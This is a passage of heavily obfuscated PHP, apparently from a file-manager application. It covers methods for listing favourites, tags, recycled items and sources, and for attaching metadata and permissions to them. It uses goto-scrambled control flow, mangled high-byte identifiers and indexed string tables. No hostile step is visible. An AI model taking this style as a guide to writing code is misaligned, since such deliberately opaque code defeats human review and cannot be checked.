$CœÅ²ŒèÙÂ[77] : $CœÅ²ŒèÙÂ[192]; goto DÉ•ƒ ; AßÀ¤•Ùª¹: } public function listUserFav() { goto D…Â‰Ñâµß; d±™ ç: $Cù‘ã¥Â‡ = array_to_keyvalue($Cù‘ã¥Â‡, $AÇš¦´ÊÜÄ[33], $AÇš¦´ÊÜÄ[76]); if ($Cù‘ã¥Â‡) { $AŸÃ¯ÔÚ‘“ = $this->listSource(array($AÇš¦´ÊÜÄ[408] => array($AÇš¦´ÊÜÄ[409], $Cù‘ã¥Â‡))); } $AŸÃ¯ÔÚ‘“ = array_to_keyvalue($AŸÃ¯ÔÚ‘“[$AÇš¦´ÊÜÄ[366]], $AÇš¦´ÊÜÄ[394]); goto AŠèºÃ…ƒê; D…Â‰Ñâµß: $AÇš¦´ÊÜÄ =& $_SERVER[Ïº«‚ßèÔˆø]; $aŒ¿Œ§¼‘é = Model($AÇš¦´ÊÜÄ[406])->listData(); $Cù‘ã¥Â‡ = array_filter_by_field($aŒ¿Œ§¼‘é, $AÇš¦´ÊÜÄ[29], $AÇš¦´ÊÜÄ[407]); goto d±™ ç; AŠèºÃ…ƒê: foreach ($aŒ¿Œ§¼‘é as &$A¬ë‰æÚ®Š) { $A¬ë‰æÚ®Š = array($AÇš¦´ÊÜÄ[410] => $A¬ë‰æÚ®Š[$AÇš¦´ÊÜÄ[392]], $AÇš¦´ÊÜÄ[411] => $A¬ë‰æÚ®Š[$AÇš¦´ÊÜÄ[28]], $AÇš¦´ÊÜÄ[412] => $A¬ë‰æÚ®Š[$AÇš¦´ÊÜÄ[76]], $AÇš¦´ÊÜÄ[413] => $A¬ë‰æÚ®Š[$AÇš¦´ÊÜÄ[29]], $AÇš¦´ÊÜÄ[414] => $A¬ë‰æÚ®Š[$AÇš¦´ÊÜÄ[193]], $AÇš¦´ÊÜÄ[415] => $A¬ë‰æÚ®Š[$AÇš¦´ÊÜÄ[84]]); if ($A¬ë‰æÚ®Š[$AÇš¦´ÊÜÄ[29]] == $AÇš¦´ÊÜÄ[407] && $AŸÃ¯ÔÚ‘“[$A¬ë‰æÚ®Š[$AÇš¦´ÊÜÄ[76]]]) { $A¬ë‰æÚ®Š[$AÇš¦´ÊÜÄ[85]] = $AŸÃ¯ÔÚ‘“[$A¬ë‰æÚ®Š[$AÇš¦´ÊÜÄ[76]]]; } } unset($A¬ë‰æÚ®Š); return $aŒ¿Œ§¼‘é; goto D–ÎÀÃÍ¨Ö; D–ÎÀÃÍ¨Ö: } public function listUserTag($b°­’æ¨­´) { goto b²”š¬çŸÖ; b²”š¬çŸÖ: $d¬°ñ‰â±ˆ =& $_SERVER[Ïº«‚ßèÔˆø]; if ($b°­’æ¨­´ && !is_array($b°­’æ¨­´)) { $b°­’æ¨­´ = array($b°­’æ¨­´); } $bÈ×ï = Model($d¬°ñ‰â±ˆ[416])->listData(); goto FŠ¿‹±…; E‹ÔĞëÂö‘: if (!$cÕÉãìªùÃ || count($cÕĞšï¢·«) == $cÕÉãìªùÃ[$d¬°ñ‰â±ˆ[363]][$d¬°ñ‰â±ˆ[364]]) { return $cÕÉãìªùÃ; } $a½ÇŠÑ®–Ï = array(); $C£‚Ú…• = array_to_keyvalue($cÕÉãìªùÃ[$d¬°ñ‰â±ˆ[75]], $d¬°ñ‰â±ˆ[33], $d¬°ñ‰â±ˆ[394]); goto aãÓ•´×¼; FŠ¿‹±…: $dŞÆÈ†¶•¶ = array(); foreach ($bÈ×ï as $c®—ÅùŒø) { $Eß¢”ºô¼« = $c®—ÅùŒø[$d¬°ñ‰â±ˆ[76]]; if (!$Eß¢”ºô¼«) { continue; } if (!isset($dŞÆÈ†¶•¶[$Eß¢”ºô¼«])) { $dŞÆÈ†¶•¶[$Eß¢”ºô¼«] = array(); } $dŞÆÈ†¶•¶[$Eß¢”ºô¼«][] = $c®—ÅùŒø[$d¬°ñ‰â±ˆ[417]]; } $cÕĞšï¢·« = array(); goto Eø‰›è©ñø; aãÓ•´×¼: $fëÇ¬“Ê¶ = array_to_keyvalue($cÕÉãìªùÃ[$d¬°ñ‰â±ˆ[74]], $d¬°ñ‰â±ˆ[33], $d¬°ñ‰â±ˆ[394]); $CÃğˆ•¬ = array_merge($fëÇ¬“Ê¶, $C£‚Ú…•); foreach ($cÕĞšï¢·« as $Eß¢”ºô¼«) { if (!in_array($Eß¢”ºô¼«, $CÃğˆ•¬)) { $a½ÇŠÑ®–Ï[] = $Eß¢”ºô¼«; } } goto CÂîòŠÇ·Ó; CÂîòŠÇ·Ó: if ($a½ÇŠÑ®–Ï) { Model($d¬°ñ‰â±ˆ[418])->removeBySource($a½ÇŠÑ®–Ï); } return $cÕÉãìªùÃ; goto b£‡Ë­Û Õ; Eø‰›è©ñø: foreach ($dŞÆÈ†¶•¶ as $e”ç‘‹Â‘ => $A‡ìÑ…®ô…) { $a†‹Íø—íÄ = !0; if (!$b°­’æ¨­´) { $cÕĞšï¢·«[] = $e”ç‘‹Â‘; continue; } foreach ($b°­’æ¨­´ as $E¹˜‘Ï²„„) { if (!in_array($E¹˜‘Ï²„„, $A‡ìÑ…®ô…)) { $a†‹Íø—íÄ = !1; break; } } if ($a†‹Íø—íÄ) { $cÕĞšï¢·«[] = $e”ç‘‹Â‘; } } if (!$cÕĞšï¢·«) { return array(); } $cÕÉãìªùÃ = $this->listSource(array($d¬°ñ‰â±ˆ[408] => array($d¬°ñ‰â±ˆ[409], $cÕĞšï¢·«))); goto E‹ÔĞëÂö‘; b£‡Ë­Û Õ: } public function listUserRecycle() { $E„Ÿ¼…»”• =& $_SERVER[Ïº«‚ßèÔˆø]; $bšÚ‹„˜Ê = Model($E„Ÿ¼…»”•[419])->listData(); if (!$bšÚ‹„˜Ê) { return array(); } $C¤Šó…Û…Ù = array($E„Ÿ¼…»”•[408] => array($E„Ÿ¼…»”•[409], $bšÚ‹„˜Ê), $E„Ÿ¼…»”•[420] => 1); return $this->listSource($C¤Šó…Û…Ù); } public function listSource($cÜíËµÏº¦, $eĞ©Ñµè = 3000) { goto c’ŒğØº¥¾; c’ŒğØº¥¾: $bÜÓó‹Á·Â =& $_SERVER[Ïº«‚ßèÔˆø]; if (!isset($cÜíËµÏº¦[$bÜÓó‹Á·Â[421]])) { $cÜíËµÏº¦[$bÜÓó‹Á·Â[421]] = 0; } $a¿ãßÀÓµˆ = $bÜÓó‹Á·Â[422]; goto bÄØ×­Ò; bÄØ×­Ò: $f¿í™ôœÉ = $this->field($a¿ãßÀÓµˆ)->_makeOrder()->where($cÜíËµÏº¦)->selectPage($eĞ©Ñµè); $this->_listDataApply($f¿í™ôœÉ[$bÜÓó‹Á·Â[366]]); $this->_listMake($f¿í™ôœÉ); goto D±¦Ù¶¨†; D±¦Ù¶¨†: return $f¿í™ôœÉ; goto fÃÛç„’Ã–; fÃÛç„’Ã–: } protected function _makeOrder() { goto B†…ºğ…  ; eÔŞÅó…±ê: $DãÍò‰•İÙ = Input::get($bæ—«¬ãõ¡[434], $bæ—«¬ãõ¡[7], $A“š¯˜µå, array_keys($fÔÕçÙ‰ë¥)); if (!in_array($b†‚ÒŠ¢À, array_keys($dó¾Şé‡©))) { $b†‚ÒŠ¢À = $bæ—«¬ãõ¡[28]; } if (!in_array($DãÍò‰•İÙ, array_keys($fÔÕçÙ‰ë¥))) { $b†‚ÒŠ¢À = $bæ—«¬ãõ¡[426]; } goto C«˜É¥­Ş; B†…ºğ…  : $bæ—«¬ãõ¡ =& $_SERVER[Ïº«‚ßèÔˆø]; $FèÏŸ‘ƒóç = Model($bæ—«¬ãõ¡[423])->get($bæ—«¬ãõ¡[424]); $A“š¯˜µå = Model($bæ—«¬ãõ¡[423])->get($bæ—«¬ãõ¡[425]); goto b²îéõ‰ùù; b²îéõ‰ùù: $fÔÕçÙ‰ë¥ = array($bæ—«¬ãõ¡[426] => $bæ—«¬ãõ¡[427], $bæ—«¬ãõ¡[428] => $bæ—«¬ãõ¡[429]); $dó¾Şé‡© = array($bæ—«¬ãõ¡[28] => $bæ—«¬ãõ¡[28], $bæ—«¬ãõ¡[78] => $bæ—«¬ãõ¡[78], $bæ—«¬ãõ¡[168] => $bæ—«¬ãõ¡[403], $bæ—«¬ãõ¡[430] => $bæ—«¬ãõ¡[430], $bæ—«¬ãõ¡[431] => $bæ—«¬ãõ¡[432], $bæ—«¬ãõ¡[193] => $bæ—«¬ãõ¡[193], $bæ—«¬ãõ¡[84] => $bæ—«¬ãõ¡[84]); $b†‚ÒŠ¢À = Input::get($bæ—«¬ãõ¡[433], $bæ—«¬ãõ¡[7], $FèÏŸ‘ƒóç, array_keys($dó¾Şé‡©)); goto eÔŞÅó…±ê; C«˜É¥­Ş: if ($b†‚ÒŠ¢À == $bæ—«¬ãõ¡[28]) { } $Dñ¥Ğ¬âá = $bæ—«¬ãõ¡[435] . $dó¾Şé‡©[$b†‚ÒŠ¢À] . $bæ—«¬ãõ¡[50] . $fÔÕçÙ‰ë¥[$DãÍò‰•İÙ]; return $this->order(rtrim(trim($Dñ¥Ğ¬âá), $bæ—«¬ãõ¡[47])); goto F³Œ¡›ì…‡; F³Œ¡›ì…‡: } protected function _listDataApplyItem($D‘‡–ŒÀ‡, $aƒ‹¾ï³ò’ = false) { $EÚÍ¢Æñï = array($D‘‡–ŒÀ‡); $this->_listDataApply($EÚÍ¢Æñï, $aƒ‹¾ï³ò’); return $EÚÍ¢Æñï[0]; } protected function _listDataApply(&$CßêÃÛ„›Á, $eÄÜ³…‹ÂÒ = false) { goto d¯˜‡İŠŠÉ; FõÙ±õÏè°: $bø„‰Ù¶”í = array_unique($bø„‰Ù¶”í); $this->_listSourceCache($CßêÃÛ„›Á); if (!$eÄÜ³…‹ÂÒ) { $this->_listAppendMeta($CßêÃÛ„›Á, $bø„‰Ù¶”í); $this->_listAppendFileMeta($CßêÃÛ„›Á, $bø„‰Ù¶”í); $this->_listAppendChildren($CßêÃÛ„›Á, $bø„‰Ù¶”í); } goto BîÖÓÛã½ß; b¾‚œ–‡Şñ: $this->_listAppendUser($CßêÃÛ„›Á); $this->_listFilterInfo($CßêÃÛ„›Á, $eÄÜ³…‹ÂÒ); goto A¾×Ôö¶; d¯˜‡İŠŠÉ: $B¼â§¦ø” =& $_SERVER[Ïº«‚ßèÔˆø]; if (!$CßêÃÛ„›Á) { $CßêÃÛ„›Á = array(); return; } $bø„‰Ù¶”í = array_to_keyvalue($CßêÃÛ„›Á, $B¼â§¦ø”[33], $B¼â§¦ø”[394]); goto FõÙ±õÏè°; BîÖÓÛã½ß: $this->_listAppendPath($CßêÃÛ„›Á); $this->_listAppendAuth($CßêÃÛ„›Á); $this->_listAppendSourceInfo($CßêÃÛ„›Á, $bø„‰Ù¶”í); goto b¾‚œ–‡Şñ; A¾×Ôö¶: } protected function _listSourceCache($EÅ¾Åø“Ö) { $Fê‘®ğ§–“ =& $_SERVER[Ïº«‚ßèÔˆø]; foreach ($EÅ¾Åø“Ö as $Bİ¨”Š„ƒö) { self::$cacheSourceInfo[$Fê‘®ğ§–“[436] . $Bİ¨”Š„ƒö[$Fê‘®ğ§–“[394]]] = $Bİ¨”Š„ƒö; } } protected function _listFilterInfo(&$bø–Ø¸·Ÿ, $AÔ¢ÉÛñÉø = false) { $a¶Ú‡»Ğ‘­ =& $_SERVER[Ïº«‚ßèÔˆø]; foreach ($bø–Ø¸·Ÿ as &$a¯‘ëÚõ¢¯) { $a¯‘ëÚõ¢¯ = $this->pathInfoFilter($a¯‘ëÚõ¢¯); self::$cachePathInfo[$a¶Ú‡»Ğ‘­[437] . intval($AÔ¢ÉÛñÉø) . $a¶Ú‡»Ğ‘­[438] . $a¯‘ëÚõ¢¯[$a¶Ú‡»Ğ‘­[394]]] = $a¯‘ëÚõ¢¯; } unset($a¯‘ëÚõ¢¯); } protected function _listMake(&$bÔš¬Œø×Ï) { $DŠ¬¥ÆÔ÷ =& $_SERVER[Ïº«‚ßèÔˆø]; $bÔš¬Œø×Ï[$DŠ¬¥ÆÔ÷[75]] = array(); $bÔš¬Œø×Ï[$DŠ¬¥ÆÔ÷[74]] = array(); foreach ($bÔš¬Œø×Ï[$DŠ¬¥ÆÔ÷[366]] as $c†àà¡µñÕ) { $CóÄ–åğ§ß = $c†àà¡µñÕ[$DŠ¬¥ÆÔ÷[401]] == 1 ? $DŠ¬¥ÆÔ÷[75] : $DŠ¬¥ÆÔ÷[74]; $bÔš¬Œø×Ï[$CóÄ–åğ§ß][] = $c†àà¡µñÕ; } unset($bÔš¬Œø×Ï[$DŠ¬¥ÆÔ÷[366]]); } protected function _listAppendMeta(&$aƒŠ–¢Á‹¢, $Dî ÁØ”—š) { goto b˜œ¥ç²±Ï; b˜œ¥ç²±Ï: $fôœœâ” =& $_SERVER[Ïº«‚ßèÔˆø]; $bõâ±ÎôÃ = array($fôœœâ”[408] => array($fôœœâ”[409], $Dî ÁØ”—š)); $eŒù‹µÆ÷ = Model($fôœœâ”[439])->field($fôœœâ”[440])->where($bõâ±ÎôÃ)->select(); goto FË´ÕÌÁÙœ; cğ©¥†ãš¯: foreach ($eŒù‹µÆ÷ as $a©Ö™ù‰Û) { if (!isset($F„…é §¦•[$a©Ö™ù‰Û[$fôœœâ”[394]]])) { $F„…é §¦•[$a©Ö™ù‰Û[$fôœœâ”[394]]] = array(); } if (in_array($a©Ö™ù‰Û[$fôœœâ”[93]], $D”—˜â¶ìã)) { continue; } $F„…é §¦•[$a©Ö™ù‰Û[$fôœœâ”[394]]][$a©Ö™ù‰Û[$fôœœâ”[93]]] = $a©Ö™ù‰Û[$fôœœâ”[371]]; } foreach ($aƒŠ–¢Á‹¢ as &$E„²ôéÍÔ) { $E„²ôéÍÔ[$fôœœâ”[443]] = !1; if (isset($F„…é §¦•[$E„²ôéÍÔ[$fôœœâ”[394]]])) { $E„²ôéÍÔ[$fôœœâ”[443]] = $F„…é §¦•[$E„²ôéÍÔ[$fôœœâ”[394]]]; } if ($this->fileIsLock($E„²ôéÍÔ) && $E„²ôéÍÔ[$fôœœâ”[404]]) { $BÒÂë»ôˆò = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $E„²ôéÍÔ[$fôœœâ”[404]][$fôœœâ”[405]] = AuthModel::authDisable($E„²ôéÍÔ[$fôœœâ”[404]][$fôœœâ”[405]], $BÒÂë»ôˆò); $E„²ôéÍÔ[$fôœœâ”[404]][$fôœœâ”[444]][$fôœœâ”[404]] = $E„²ôéÍÔ[$fôœœâ”[404]][$fôœœâ”[405]]; } } unset($E„²ôéÍÔ); goto C·ëõÁ¬ïŸ; FË´ÕÌÁÙœ: if (!$eŒù‹µÆ÷) { return; } $D”—˜â¶ìã = array($fôœœâ”[441], $fôœœâ”[442]); $F„…é §¦• = array(); goto cğ©¥†ãš¯; C·ëõÁ¬ïŸ: } protected function _listAppendFileMeta(&$f¼„ ë¶Ê˜, $bÛÂ£¹¿«¶) { goto fñíºÎí¾¯; d‰¼ò•ˆí: if (!$bøÇÆĞ·ŒÄ) { return; } $FÍí˜²¯õÓ = array($c‚Ò«ÅÎÄ¿[446] => array($c‚Ò«ÅÎÄ¿[409], $bøÇÆĞ·ŒÄ)); $E½áÎ«àã³ = $c‚Ò«ÅÎÄ¿[447]; goto Aºã‡‹á°; fñíºÎí¾¯: $c‚Ò«ÅÎÄ¿ =& $_SERVER[Ïº«‚ßèÔˆø]; $bøÇÆĞ·ŒÄ = array_to_keyvalue($f¼„ ë¶Ê˜, $c‚Ò«ÅÎÄ¿[33], $c‚Ò«ÅÎÄ¿[445]); $bøÇÆĞ·ŒÄ = array_filter(array_unique($bøÇÆĞ·ŒÄ)); goto d‰¼ò•ˆí; dµö—íÈÃ: foreach ($f¼„ ë¶Ê˜ as &$bŠ–•»âŸ) { goto fØ¡Á¼¼Ò; bóˆ·Ú¢ŸÊ: if (isset($bŠ–•»âŸ[$c‚Ò«ÅÎÄ¿[164]][$c‚Ò«ÅÎÄ¿[163]])) { $bŠ–•»âŸ[$c‚Ò«ÅÎÄ¿[163]] = json_decode($bŠ–•»âŸ[$c‚Ò«ÅÎÄ¿[164]][$c‚Ò«ÅÎÄ¿[163]], !0); unset($bŠ–•»âŸ[$c‚Ò«ÅÎÄ¿[164]][$c‚Ò«ÅÎÄ¿[163]]); } goto CæòÆùÖµÁ; fØ¡Á¼¼Ò: $C·¦–ñ‰Œ› = $bŠ–•»âŸ[$c‚Ò«ÅÎÄ¿[445]]; if (!$C·¦–ñ‰Œ› || !is_array($E‡ÕøìğŠ½[$C·¦–ñ‰Œ›])) { continue; } $cÔ‡ÄÏ = $E‡ÕøìğŠ½[$C·¦–ñ‰Œ›]; goto DÃ…ìÇÒà‚; eéç®¢ùš©: unset($E‡ÕøìğŠ½[$C·¦–ñ‰Œ›][$c‚Ò«ÅÎÄ¿[76]]); $Aô¬¡«ªÅ = is_array($f»¦×èÌˆã[$C·¦–ñ‰Œ›]) ? $f»¦×èÌˆã[$C·¦–ñ‰Œ›] : array(); $bŠ–•»âŸ[$c‚Ò«ÅÎÄ¿[164]] = array_merge($Aô¬¡«ªÅ, $E‡ÕøìğŠ½[$C·¦–ñ‰Œ›]); goto bóˆ·Ú¢ŸÊ; DÃ…ìÇÒà‚: $cÔ‡ÄÏ[$c‚Ò«ÅÎÄ¿[78]] = $bŠ–•»âŸ[$c‚Ò«ÅÎÄ¿[78]]; $cÔ‡ÄÏ[$c‚Ò«ÅÎÄ¿[28]] = $bŠ–•»âŸ[$c‚Ò«ÅÎÄ¿[28]]; if (!isset(self::$cacheFileInfo[$c‚Ò«ÅÎÄ¿[451] . $C·¦–ñ‰Œ›])) { self::$cacheFileInfo[$c‚Ò«ÅÎÄ¿[451] . $C·¦–ñ‰Œ›] = array_merge(array(), $cÔ‡ÄÏ); } goto eéç®¢ùš©; CæòÆùÖµÁ: } unset($bŠ–•»âŸ); goto B ÔŠöä÷; Aºã‡‹á°: $E‡ÕøìğŠ½ = Model($c‚Ò«ÅÎÄ¿[448])->field($E½áÎ«àã³)->where($FÍí˜²¯õÓ)->select(); $E‡ÕøìğŠ½ = array_to_keyvalue($E‡ÕøìğŠ½, $c‚Ò«ÅÎÄ¿[445]); $E‰¶Ü¨ê—É = Model($c‚Ò«ÅÎÄ¿[449])->field($c‚Ò«ÅÎÄ¿[450])->where($FÍí˜²¯õÓ)->select(); goto A»„é½©¤³; A»„é½©¤³: $E‰¶Ü¨ê—É = $E‰¶Ü¨ê—É ? $E‰¶Ü¨ê—É : array(); $f»¦×èÌˆã = array(); foreach ($E‰¶Ü¨ê—É as $bš¼–øÓ¾½) { if (!isset($f»¦×èÌˆã[$bš¼–øÓ¾½[$c‚Ò«ÅÎÄ¿[445]]])) { $f»¦×èÌˆã[$bš¼–øÓ¾½[$c‚Ò«ÅÎÄ¿[445]]] = array(); } $f»¦×èÌˆã[$bš¼–øÓ¾½[$c‚Ò«ÅÎÄ¿[445]]][$bš¼–øÓ¾½[$c‚Ò«ÅÎÄ¿[93]]] = $bš¼–øÓ¾½[$c‚Ò«ÅÎÄ¿[371]]; } goto dµö—íÈÃ; B ÔŠöä÷: } protected function _listAppendSourceInfo(&$D×ŠÜ¶Œ·, $fÈÆõ›¯§À) { goto cÔ™ŒÍ¬×; E±²õõÍŠ: $f±¤‚‘ÚÉ = array_to_keyvalue_group($BÕ±Êø‰ó, $fÂØÅ“Ô‘[394]); foreach ($D×ŠÜ¶Œ· as &$CôØ¨ñÇÎ…) { $CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[85]] = array($fÂØÅ“Ô‘[455] => 0, $fÂØÅ“Ô‘[456] => 0, $fÂØÅ“Ô‘[457] => 0); if (isset($eß‚À§¾Õ†[$CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[394]]])) { $CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[85]][$fÂØÅ“Ô‘[458]] = 1; $CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[85]][$fÂØÅ“Ô‘[459]] = $eß‚À§¾Õ†[$CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[394]]][$fÂØÅ“Ô‘[28]]; } if (isset($AäÜÉ–‚¢[$CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[394]]])) { $CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[85]][$fÂØÅ“Ô‘[460]] = array(); foreach ($AäÜÉ–‚¢[$CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[394]]] as $BíÔºÏ›Ğ) { $f˜ÛÑøË¡• = $D›Ô…ğ‰ĞÁ[$BíÔºÏ›Ğ]; $CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[85]][$fÂØÅ“Ô‘[460]][] = array($fÂØÅ“Ô‘[461] => $f˜ÛÑøË¡•[$fÂØÅ“Ô‘[392]], $fÂØÅ“Ô‘[411] => $f˜ÛÑøË¡•[$fÂØÅ“Ô‘[28]], $fÂØÅ“Ô‘[462] => $f˜ÛÑøË¡•[$fÂØÅ“Ô‘[463]]); } } if (isset($f±¤‚‘ÚÉ[$CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[394]]])) { $CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[85]][$fÂØÅ“Ô‘[464]] = array(); foreach ($f±¤‚‘ÚÉ[$CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[394]]] as $aƒÒ‹¢ø´·) { $CôØ¨ñÇÎ…[$fÂØÅ“Ô‘[85]][$fÂØÅ“Ô‘[464]] = array($fÂØÅ“Ô‘[465] => $aƒÒ‹¢ø´·[$fÂØÅ“Ô‘[466]], $fÂØÅ“Ô‘[467] => $aƒÒ‹¢ø´·[$fÂØÅ“Ô‘[468]], $fÂØÅ“Ô‘[469] => $aƒÒ‹¢ø´·[$fÂØÅ“Ô‘[394]], $fÂØÅ“Ô‘[470] => $aƒÒ‹¢ø´·[$fÂØÅ“Ô‘[471]], $fÂØÅ“Ô‘[472] => $aƒÒ‹¢ø´·[$fÂØÅ“Ô‘[473]], $fÂØÅ“Ô‘[474] => $aƒÒ‹¢ø´·[$fÂØÅ“Ô‘[474]], $fÂØÅ“Ô‘[475] => $aƒÒ‹¢ø´·[$fÂØÅ“Ô‘[475]]); } } } unset($CôØ¨ñÇÎ…); goto a÷×Ğ±©óª; C”Íµèˆš‚: $BâÆôëÀ = Model($fÂØÅ“Ô‘[416])->listData(); $eË“Øôäƒ = Model($fÂØÅ“Ô‘[406])->listData(); $BÕ±Êø‰ó = Model($fÂØÅ“Ô‘[454])->listSimple(); goto A©›¼ë£; a÷×Ğ±©óª: return $D×ŠÜ¶Œ·; goto BíÏšÂ¼œ; cÔ™ŒÍ¬×: $fÂØÅ“Ô‘ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!defined($fÂØÅ“Ô‘[452])) { return; } $DÊ‚ÏçõÁ‘ = Model($fÂØÅ“Ô‘[453])->listData(); goto C”Íµèˆš‚; A©›¼ë£: $D›Ô…ğ‰ĞÁ = array_to_keyvalue($DÊ‚ÏçõÁ‘, $fÂØÅ“Ô‘[392]); $AäÜÉ–‚¢ = array_to_keyvalue_group($BâÆôëÀ, $fÂØÅ“Ô‘[76], $fÂØÅ“Ô‘[417]); $eß‚À§¾Õ† = array_to_keyvalue($eË“Øôäƒ, $fÂØÅ“Ô‘[76]); goto E±²õõÍŠ; BíÏšÂ¼œ: } protected function _listAppendChildren(&$dáÒæøË Â, $F…ÄôÙöô³) { goto càõ¯È†; E‰àæ°õˆß: $eÃÀÙ«¼Ñù = array(); foreach ($cèùšŠ‡Ìİ as $CÁêÂ‚„â) { $bÂª³»‹ºË = $CÁêÂ‚„â[$A×•îË˜¥[476]]; $d†²©²¯öå = $CÁêÂ‚„â[$A×•îË˜¥[401]] == $A×•îË˜¥[87] ? $A×•îË˜¥[203] : $A×•îË˜¥[202]; if (!isset($eÃÀÙ«¼Ñù[$bÂª³»‹ºË])) { $eÃÀÙ«¼Ñù[$bÂª³»‹ºË] = array($A×•îË˜¥[202] => 0, $A×•îË˜¥[203] => 0); } $eÃÀÙ«¼Ñù[$bÂª³»‹ºË][$d†²©²¯öå] += $CÁêÂ‚„â[$A×•îË˜¥[478]]; } foreach ($dáÒæøË Â as &$f²÷Ëô¢Ÿ) { if (!$f²÷Ëô¢Ÿ[$A×•îË˜¥[401]]) { continue; } $B”˜§ÊæÄ = is_array($eÃÀÙ«¼Ñù[$f²÷Ëô¢Ÿ[$A×•îË˜¥[394]]]) ? $eÃÀÙ«¼Ñù[$f²÷Ëô¢Ÿ[$A×•îË˜¥[394]]] : $F»ïã•Œæ‘; $f²÷Ëô¢Ÿ[$A×•îË˜¥[203]] = $B”˜§ÊæÄ[$A×•îË˜¥[203]]; $f²÷Ëô¢Ÿ[$A×•îË˜¥[202]] = $B”˜§ÊæÄ[$A×•îË˜¥[202]]; unset($f²÷Ëô¢Ÿ[$A×•îË˜¥[403]]); } goto b¶¥ÅØÒ¶Ş; càõ¯È†: $A×•îË˜¥ =& $_SERVER[Ïº«‚ßèÔˆø]; $bâŠŠÌöŠ‡ = array(); $F»ïã•Œæ‘ = array($A×•îË˜¥[202] => 0, $A×•îË˜¥[203] => 0); goto E™çä«ØÇŠ; b¶¥ÅØÒ¶Ş: unset($f²÷Ëô¢Ÿ); goto bÑÇÛôİ‰; A®­Ë×ÄÂè: $E¹•–¬ÏÛ° = array($A×•îË˜¥[476] => array($A×•îË˜¥[7], $bâŠŠÌöŠ‡)); $aÁˆÇ†õ•ò = array($A×•îË˜¥[476], $A×•îË˜¥[401], $A×•îË˜¥[477] => $A×•îË˜¥[478]); $cèùšŠ‡Ìİ = $this->field($aÁˆÇ†õ•ò)->where($E¹•–¬ÏÛ°)->group($A×•îË˜¥[479])->select(); goto E‰àæ°õˆß; E™çä«ØÇŠ: foreach ($dáÒæøË Â as &$f²÷Ëô¢Ÿ) { if (!$f²÷Ëô¢Ÿ[$A×•îË˜¥[401]]) { continue; } $bâŠŠÌöŠ‡[] = $f²÷Ëô¢Ÿ[$A×•îË˜¥[394]]; } unset($f²÷Ëô¢Ÿ); if (!$bâŠŠÌöŠ‡) { return; } goto A®­Ë×ÄÂè; bÑÇÛôİ‰: } protected function _listAppendAuth(&$BáäÃË×®˜) { goto DîĞÜÉ•ìÎ; FÁ…£ºˆùÊ: $dÌ»ì™ßĞ = Model($e‰à‹ğßá‹[480])->getSourceList($bçŒîŸôÛì, $D²ãŸİ»‹¶); foreach ($BáäÃË×®˜ as $D¢ô³»Í³£ => &$aÔù™–Œ­ß) { $aÔù™–Œ­ß[$e‰à‹ğßá‹[404]] = $dÌ»ì™ßĞ[$aÔù™–Œ­ß[$e‰à‹ğßá‹[394]]]; if (!$aÔù™–Œ­ß[$e‰à‹ğßá‹[404]] && $aÔù™–Œ­ß[$e‰à‹ğßá‹[402]] == self::TYPE_GROUP) { $aÔù™–Œ­ß[$e‰à‹ğßá‹[404]] = Action($e‰à‹ğßá‹[481])->pathGroupAuthMake($aÔù™–Œ­ß[$e‰à‹ğßá‹[482]]); if (!$aÔù™–Œ­ß[$e‰à‹ğßá‹[404]] && !_get($GLOBALS, $e‰à‹ğßá‹[483])) { $aÔù™–Œ­ß[$e‰à‹ğßá‹[195]] = !1; $aÔù™–Œ­ß[$e‰à‹ğßá‹[194]] = !1; } } if ($aÔù™–Œ­ß[$e‰à‹ğßá‹[404]]) { $aÔù™–Œ­ß[$e‰à‹ğßá‹[195]] = AuthModel::authCheckEdit($aÔù™–Œ­ß[$e‰à‹ğßá‹[404]][$e‰à‹ğßá‹[405]]); $aÔù™–Œ­ß[$e‰à‹ğßá‹[194]] = AuthModel::authCheckView($aÔù™–Œ­ß[$e‰à‹ğßá‹[404]][$e‰à‹ğßá‹[405]]); } $this->groupPathDisplay($aÔù™–Œ­ß); } unset($aÔù™–Œ­ß); goto D£¿ÉÃºç”; DîĞÜÉ•ìÎ: $e‰à‹ğßá‹ =& $_SERVER[Ïº«‚ßèÔˆø]; if (!defined($e‰à‹ğßá‹[452])) { return; } $bçŒîŸôÛì = array(); goto a´´Õ¥ëËò; a´´Õ¥ëËò: foreach ($BáäÃË×®˜ as $aÔù™–Œ­ß) { if ($aÔù™–Œ­ß[$e‰à‹ğßá‹[402]] == self::TYPE_GROUP) { $bçŒîŸôÛì[] = $aÔù™–Œ­ß[$e‰à‹ğßá‹[394]]; } } if (!$bçŒîŸôÛì) { return; } $D²ãŸİ»‹¶ = array_to_keyvalue($BáäÃË×®˜, $e‰à‹ğßá‹[394]); goto FÁ…£ºˆùÊ; D£¿ÉÃºç”: } public function groupPathDisplay(&$A““êõ·»ò) { goto cŠºº‰†Ìò; FéË‚¾Û‡å: $A““êõ·»ò[$B‚æ®•…äº[486]] = $F”¹óæ“™ª[$B‚æ®•…äº[476]]; $A““êõ·»ò[$B‚æ®•…äº[487]] = $F”¹óæ“™ª[$B‚æ®•…äº[485]]; $A““êõ·»ò[$B‚æ®•…äº[488]] = $F”¹óæ“™ª[$B‚æ®•…äº[489]]; goto cœ‘¢ê¥ˆÄ; D¢Şö¤·í: $eñº»ÍƒĞê = $this->parentLevelArray($F”¹óæ“™ª[$B‚æ®•…äº[485]]); $C¾óù¼ƒŸ‹ = $B‚æ®•…äº[33]; foreach ($eñº»ÍƒĞê as $FŒ“ôêµ­¿) { $d¥–Ø†‰ = Model($B‚æ®•…äº[484])->getInfo($FŒ“ôêµ­¿); $C¾óù¼ƒŸ‹ .= $d¥–Ø†‰[$B‚æ®•…äº[85]][$B‚æ®•…äº[394]] . $B‚æ®•…äº[47]; } goto FéË‚¾Û‡å; cŠºº‰†Ìò: $B‚æ®•…äº =& $_SERVER[Ïº«‚ßèÔˆø]; if ($A““êõ·»ò[$B‚æ®•…äº[402]] != self::TYPE_GROUP) { return; } $F”¹óæ“™ª = 